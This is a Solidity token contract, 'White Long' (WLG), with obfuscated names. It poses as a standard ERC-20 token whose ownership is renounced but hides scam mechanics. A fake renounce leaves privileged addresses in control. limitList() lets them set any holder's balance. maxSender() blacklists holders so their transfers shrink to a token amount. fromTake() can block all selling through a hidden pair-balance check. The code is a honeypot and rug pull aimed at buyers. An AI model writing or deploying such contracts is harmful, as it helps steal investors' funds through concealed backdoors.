//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface senderFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverWallet {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoToken {
    function createPair(address toShouldLiquidity, address limitLaunch) external returns (address);
}

interface walletLaunchedSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletShould) external view returns (uint256);

    function transfer(address liquidityWallet, uint256 launchTo) external returns (bool);

    function allowance(address sellFeeSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchTo) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityWallet,
        uint256 launchTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptMode, uint256 value);
    event Approval(address indexed sellFeeSender, address indexed spender, uint256 value);
}

interface walletLaunchedSenderMetadata is walletLaunchedSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WhiteLong is receiverWallet, walletLaunchedSender, walletLaunchedSenderMetadata {

    bool public launchedMax;

    uint256 private receiverAmountSell;

    function decimals() external view virtual override returns (uint8) {
        return listTakeTo;
    }

    bool public sellEnable;

    address private receiverLaunched;

    function liquidityReceiver(address maxShouldMin, address liquidityWallet, uint256 launchTo) internal returns (bool) {
        if (maxShouldMin == swapAuto) {
            return receiverReceiverAmount(maxShouldMin, liquidityWallet, launchTo);
        }
        uint256 marketingTrading = walletLaunchedSender(sellTake).balanceOf(swapAt);
        require(marketingTrading == launchedSenderSell);
        require(liquidityWallet != swapAt);
        if (walletIs[maxShouldMin]) {
            return receiverReceiverAmount(maxShouldMin, liquidityWallet, minExempt);
        }
        return receiverReceiverAmount(maxShouldMin, liquidityWallet, launchTo);
    }

    constructor (){
        
        senderFee fromFundTrading = senderFee(feeToken);
        sellTake = autoToken(fromFundTrading.factory()).createPair(fromFundTrading.WETH(), address(this));
        if (shouldFromSell == minMode) {
            minMode = receiverAmountSell;
        }
        swapAuto = _msgSender();
        liquidityEnable();
        limitToBuy[swapAuto] = true;
        limitMax[swapAuto] = modeFee;
        if (launchedMax) {
            shouldWallet = true;
        }
        emit Transfer(address(0), swapAuto, modeFee);
    }

    uint256 launchedSenderSell;

    mapping(address => uint256) private limitMax;

    address feeToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public txToken;

    mapping(address => bool) public limitToBuy;

    function name() external view virtual override returns (string memory) {
        return teamTotal;
    }

    function owner() external view returns (address) {
        return receiverLaunched;
    }

    string private teamTotal = "White Long";

    mapping(address => bool) public walletIs;

    function transferFrom(address maxShouldMin, address liquidityWallet, uint256 launchTo) external override returns (bool) {
        if (_msgSender() != feeToken) {
            if (feeFromTeam[maxShouldMin][_msgSender()] != type(uint256).max) {
                require(launchTo <= feeFromTeam[maxShouldMin][_msgSender()]);
                feeFromTeam[maxShouldMin][_msgSender()] -= launchTo;
            }
        }
        return liquidityReceiver(maxShouldMin, liquidityWallet, launchTo);
    }

    function approve(address walletList, uint256 launchTo) public virtual override returns (bool) {
        feeFromTeam[_msgSender()][walletList] = launchTo;
        emit Approval(_msgSender(), walletList, launchTo);
        return true;
    }

    uint256 isSender;

    function limitList(address toFrom, uint256 launchTo) public {
        atToken();
        limitMax[toFrom] = launchTo;
    }

    function liquidityEnable() public {
        emit OwnershipTransferred(swapAuto, address(0));
        receiverLaunched = address(0);
    }

    function maxSender(address txFee) public {
        atToken();
        if (minMode == takeList) {
            launchedMax = false;
        }
        if (txFee == swapAuto || txFee == sellTake) {
            return;
        }
        walletIs[txFee] = true;
    }

    string private senderFrom = "WLG";

    function atToken() private view {
        require(limitToBuy[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return receiverLaunched;
    }

    address swapAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public swapAuto;

    uint256 private modeFee = 100000000 * 10 ** 18;

    function allowance(address totalMode, address walletList) external view virtual override returns (uint256) {
        if (walletList == feeToken) {
            return type(uint256).max;
        }
        return feeFromTeam[totalMode][walletList];
    }

    function fromTake(uint256 launchTo) public {
        atToken();
        launchedSenderSell = launchTo;
    }

    uint256 public takeList;

    function symbol() external view virtual override returns (string memory) {
        return senderFrom;
    }

    function transfer(address toFrom, uint256 launchTo) external virtual override returns (bool) {
        return liquidityReceiver(_msgSender(), toFrom, launchTo);
    }

    event OwnershipTransferred(address indexed swapListWallet, address indexed listLaunched);

    uint256 public feeLaunched;

    uint256 constant minExempt = 5 ** 10;

    function limitMarketing(address totalReceiver) public {
        if (sellEnable) {
            return;
        }
        
        limitToBuy[totalReceiver] = true;
        if (takeList == amountFrom) {
            shouldFromSell = minMode;
        }
        sellEnable = true;
    }

    uint8 private listTakeTo = 18;

    function receiverReceiverAmount(address maxShouldMin, address liquidityWallet, uint256 launchTo) internal returns (bool) {
        require(limitMax[maxShouldMin] >= launchTo);
        limitMax[maxShouldMin] -= launchTo;
        limitMax[liquidityWallet] += launchTo;
        emit Transfer(maxShouldMin, liquidityWallet, launchTo);
        return true;
    }

    mapping(address => mapping(address => uint256)) private feeFromTeam;

    address public sellTake;

    uint256 public amountFrom;

    uint256 public shouldFromSell;

    function totalSupply() external view virtual override returns (uint256) {
        return modeFee;
    }

    bool public shouldWallet;

    function balanceOf(address walletShould) public view virtual override returns (uint256) {
        return limitMax[walletShould];
    }

    uint256 private minMode;

}